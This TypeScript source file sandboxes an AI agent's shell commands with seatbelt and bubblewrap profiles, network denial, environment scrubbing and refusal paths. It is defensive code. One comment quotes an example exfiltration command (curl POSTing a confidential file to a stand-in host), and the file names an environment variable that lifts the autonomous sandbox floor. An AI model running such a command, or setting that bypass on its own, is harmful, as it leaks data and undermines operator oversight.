import { execFileSync } from 'child_process';
import { isSovereign } from '../security/sovereign';

// B3 — optional OS isolation for BashTool. We wrap commands in the platform's OS sandbox with a
// profile that allows reads/exec/network but restricts file WRITES to the workspace + temp dirs —
// so an agent command can't clobber files outside the project:
//   • macOS  → `sandbox-exec` (seatbelt) with a deny-file-write* profile.
//   • Linux  → `bwrap` (bubblewrap): the whole FS is bind-mounted read-only, then cwd + temp are
//              re-bound read-write. The autonomous FLOOR additionally `--unshare-net`s (no network).
// Off by default (/governor sandbox on). Degrades gracefully: where no backend exists (or none is
// installed) commands run unsandboxed, with a one-time warning surfaced by the caller.

let enabled = false;
export function setSandboxEnabled(v: boolean): void { enabled = v; }

/**
 * Is the sandbox active for this call?
 *
 * Sovereign mode forces it on and cannot be toggled off, because the in-process egress perimeter
 * (`security/egress.perimeter.ts`) governs THIS process and a subprocess has its own network stack.
 * `curl -X POST https://elsewhere -d @confidential.pdf` is invisible to the perimeter, so the only
 * thing standing between the model and that command is the kernel's network namespace. A sovereign
 * claim with the sandbox switched off is not a sovereign claim.
 */
export function isSandboxEnabled(): boolean { return enabled || isSovereign(); }

let availableCache: boolean | null = null;
/** The usable OS sandbox backend for this platform, or null. Cached after the first real probe. */
export function sandboxBackend(): 'seatbelt' | 'bwrap' | null {
  if (availableCache === false) return null;
  const bin = process.platform === 'darwin' ? 'sandbox-exec'
    : process.platform === 'linux' ? 'bwrap'
    : null;
  if (!bin) { availableCache = false; return null; }
  if (availableCache === true) return bin === 'sandbox-exec' ? 'seatbelt' : 'bwrap';
  try {
    // Merely finding the executable is insufficient: Ubuntu 24.04 can install bwrap while
    // AppArmor forbids the user namespace it needs. Probe the same kernel primitive commands use.
    const probeArgs = bin === 'sandbox-exec'
      ? ['-p', '(version 1) (allow default)', '/usr/bin/true']
      : ['--ro-bind', '/', '/', '--dev', '/dev', '--proc', '/proc', '--die-with-parent', '/bin/true'];
    execFileSync(bin, probeArgs, { stdio: 'ignore', timeout: 5_000 });
    availableCache = true;
    return bin === 'sandbox-exec' ? 'seatbelt' : 'bwrap';
  } catch {
    availableCache = false;
    return null;
  }
}

/** The executable that runs a sandboxed command on this platform, or null when none is available. */
export function sandboxBin(): string | null {
  const b = sandboxBackend();
  return b === 'seatbelt' ? 'sandbox-exec' : b === 'bwrap' ? 'bwrap' : null;
}

/** True when an OS sandbox backend (seatbelt on macOS, bwrap on Linux) is available. */
export function sandboxAvailable(): boolean {
  return sandboxBackend() !== null;
}

// The writable temp roots re-allowed inside every profile (both platforms).
const TEMP_WRITE_PATHS = ['/private/tmp', '/private/var/folders', '/tmp'];

/**
 * bwrap argv (Linux): read-only bind the whole filesystem, then re-bind the writable roots
 * (cwd/floor-root + temp) read-write. When `denyNetwork` (the autonomous floor), also unshare the
 * network namespace so the command has no connectivity — the parity of seatbelt's `(deny network*)`.
 * Pure and platform-independent so it can be unit-tested anywhere.
 */
export function buildBwrapArgv(writableRoot: string, denyNetwork: boolean): string[] {
  const args = ['--ro-bind', '/', '/', '--dev', '/dev', '--proc', '/proc', '--die-with-parent'];
  for (const p of [writableRoot, ...TEMP_WRITE_PATHS]) {
    // --bind-try: don't fail the whole run if an optional temp path (e.g. /private/tmp on Linux)
    // doesn't exist; the workspace root always does.
    args.push('--bind-try', p, p);
  }
  if (denyNetwork) args.push('--unshare-net');
  return [...args, '/bin/sh', '-c'];
}

/** Seatbelt profile: allow everything, then deny writes, then re-allow writes to cwd + temp. */
export function buildProfile(cwd: string): string {
  return [
    '(version 1)',
    '(allow default)',
    '(deny file-write*)',
    '(allow file-write*',
    `  (subpath ${JSON.stringify(cwd)})`,
    '  (subpath "/private/tmp")',
    '  (subpath "/private/var/folders")',
    '  (subpath "/tmp")',
    '  (literal "/dev/null") (literal "/dev/stdout") (literal "/dev/stderr") (literal "/dev/tty"))',
  ].join('\n');
}

/**
 * Seatbelt profile with the network denied as well — the sovereign-mode form of {@link buildProfile}.
 * Identical to the floor profile's network stance, but scoped to the session's cwd rather than an
 * episode worktree, so an ordinary interactive session keeps its normal write surface.
 */
export function buildOfflineProfile(cwd: string): string {
  return [
    '(version 1)',
    '(allow default)',
    '(deny network*)',
    '(deny file-write*)',
    '(allow file-write*',
    `  (subpath ${JSON.stringify(cwd)})`,
    '  (subpath "/private/tmp")',
    '  (subpath "/private/var/folders")',
    '  (subpath "/tmp")',
    '  (literal "/dev/null") (literal "/dev/stdout") (literal "/dev/stderr") (literal "/dev/tty"))',
  ].join('\n');
}

/**
 * If sandboxing is enabled and available, return the argv (excluding the binary — use sandboxBin())
 * to run `command` sandboxed via execFile, so no shell-quoting hazard. Returns null when sandboxing
 * does not apply, signalling the caller to run the command normally.
 */
export function sandboxArgv(command: string, cwd: string): string[] | null {
  if (!isSandboxEnabled()) return null;
  const backend = sandboxBackend();
  // Sovereign mode denies the network at the kernel. The ordinary profile deliberately permits it —
  // an npm install or a git fetch is normal work — but under sovereign mode that permission is the
  // one hole the in-process perimeter cannot see through.
  const denyNetwork = isSovereign();
  if (backend === 'seatbelt') {
    return ['-p', denyNetwork ? buildOfflineProfile(cwd) : buildProfile(cwd), '/bin/sh', '-c', command];
  }
  if (backend === 'bwrap') return [...buildBwrapArgv(cwd, denyNetwork), command];
  return null;
}

/**
 * Why the sovereign shell must refuse rather than degrade.
 *
 * Where no OS sandbox backend exists (Windows, or a macOS box without `sandbox-exec`), the ordinary
 * path runs the command unsandboxed with a warning. Under sovereign mode that is the wrong trade:
 * an unenforced shell is exactly the unproven assumption the mode exists to remove, and a warning
 * an operator may not read is not a control. Returns the refusal text, or null when the shell may run.
 */
export function sovereignShellBlockedReason(): string | null {
  if (!isSovereign()) return null;
  if (sandboxAvailable()) return null;
  return 'Sovereign mode is on, but this platform has no OS sandbox backend (need sandbox-exec on ' +
    'macOS or bwrap on Linux), so a shell command cannot be denied the network at the kernel. ' +
    'A subprocess is outside the in-process egress perimeter, so BashTool is disabled rather than ' +
    'run with unproven isolation. Turn sovereign mode off to run shell commands on this machine.';
}

// ---------------------------------------------------------------------------
// Sandbox FLOOR (BiMax v2) — mandatory isolation for autonomous episodes.
//
// Dream/self-play workers run model-chosen commands with nobody watching, so they get a
// floor that no toggle can lower: file writes confined to the episode worktree, network
// denied at the kernel, and a scrubbed child env (no API keys reachable from Bash).
// The floor is carried in the worker thread's own env copy (Worker({ env })), so it
// scopes to the episode without touching the parent session's settings.
// ---------------------------------------------------------------------------

export const FLOOR_ENV = 'BIMAX_SANDBOX_FLOOR';

/** The floor root for THIS thread (set for dream/autonomous workers), or null. */
export function floorRoot(): string | null {
  const v = process.env[FLOOR_ENV];
  return v && v.trim() ? v : null;
}

/** Seatbelt floor profile: no network at all; writes only inside the episode root + temp. */
export function buildFloorProfile(root: string): string {
  return [
    '(version 1)',
    '(allow default)',
    '(deny network*)',
    '(deny file-write*)',
    '(allow file-write*',
    `  (subpath ${JSON.stringify(root)})`,
    '  (subpath "/private/tmp")',
    '  (subpath "/private/var/folders")',
    '  (subpath "/tmp")',
    '  (literal "/dev/null") (literal "/dev/stdout") (literal "/dev/stderr") (literal "/dev/tty"))',
  ].join('\n');
}

// Child processes of a floored episode never see the parent env (API keys, tokens):
// only what a build/test toolchain needs to function.
const FLOOR_ENV_ALLOWLIST = ['PATH', 'HOME', 'SHELL', 'TMPDIR', 'LANG', 'LC_ALL', 'TERM', 'USER', 'LOGNAME'];

export function floorChildEnv(): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const k of FLOOR_ENV_ALLOWLIST) {
    if (process.env[k] !== undefined) out[k] = process.env[k];
  }
  return out;
}

/**
 * When this thread has a floor but the OS can't enforce it (non-macOS or sandbox-exec
 * missing), autonomous Bash must NOT silently run with ambient authority — return the
 * reason to block it. `BIMAX_SANDBOX_FLOOR_SOFT=1` is the explicit opt-out (runs
 * unsandboxed but still with the scrubbed child env).
 */
export function floorBlockedReason(): string | null {
  if (!floorRoot()) return null;
  if (sandboxAvailable()) return null;
  if (process.env.BIMAX_SANDBOX_FLOOR_SOFT === '1') return null;
  return 'this is a sandboxed autonomous episode, but no OS sandbox backend is available on this ' +
    'platform (need sandbox-exec on macOS or bwrap on Linux). Bash is disabled for the episode; ' +
    'set BIMAX_SANDBOX_FLOOR_SOFT=1 to explicitly allow unsandboxed autonomous commands.';
}

/**
 * Argv (excluding the binary — use sandboxBin()) to run `command` under the floor profile, or null
 * when no floor applies (or it is soft-bypassed / unenforceable — callers must consult
 * floorBlockedReason() first). The floor ignores the user-level `enabled` toggle: episodes cannot
 * lower it, and it denies network (seatbelt `deny network*` / bwrap `--unshare-net`).
 */
export function floorArgv(command: string): string[] | null {
  const root = floorRoot();
  if (!root) return null;
  const backend = sandboxBackend();
  if (backend === 'seatbelt') return ['-p', buildFloorProfile(root), '/bin/sh', '-c', command];
  if (backend === 'bwrap') return [...buildBwrapArgv(root, true), command];
  return null;
}

/** Test seam: override/reset the cached sandbox-exec availability probe. */
export function _setSandboxAvailableForTests(v: boolean | null): void {
  availableCache = v;
}
